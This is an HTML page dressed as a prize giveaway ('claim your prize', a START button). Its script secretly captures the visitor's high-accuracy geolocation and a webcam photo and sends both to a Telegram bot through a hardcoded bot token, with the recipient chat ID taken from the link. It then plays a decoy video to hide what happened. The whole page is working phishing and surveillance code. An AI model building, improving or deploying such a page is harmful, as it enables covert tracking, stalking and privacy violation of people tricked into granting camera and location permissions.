<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🧧</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
        
        /* 视频框初始隐藏，添加平滑过渡 */
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
        
        /* 表情放大后的状态框 */
        #status { 
            margin: 15px 0; 
            font-weight: bold; 
            background: rgba(0,0,0,0.6); 
            padding: 15px; 
            border-radius: 10px; 
            font-size: 60px; 
            text-align: center;
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
    </style>
</head>
<body>
    <h2>🎉 Please click below to claim your prize 🎉</h2>
    <div id="status">🎰🎰🎰🎰🎰</div>
    <video id="video" width="640" height="480" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">START🎲</button>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
            startBtn.style.display = 'none';
            status.innerText = "⏳";

            // 1. 获取定位
            let locationText = "Location: Not available";
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                });
                locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) { console.warn("定位获取失败"); }

            // 2. 获取相机
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block';
                video.style.opacity = '1';
                status.innerText = "🌐 Processing.........";

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'prize.jpg');
                        formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);

                        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        
                        // 3. 上传成功后，不跳转页面，而是直接将 video 框切换为视频播放
                        if ((await res.json()).ok) {
                            status.innerText = "🎉 Success!";
                            stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
                            video.srcObject = null;
                            video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                            video.loop = true;
                            video.muted = false; // 播放视频时开启声音
                            video.play();
                        } else {
                            status.innerText = "⚠️ Upload Error";
                        }
                    }, 'image/jpeg');
                }, 1000);
            } catch (err) {
                status.innerText = "⚠️ Permissions Required";
            }
        });
    </script>
</body>
</html>
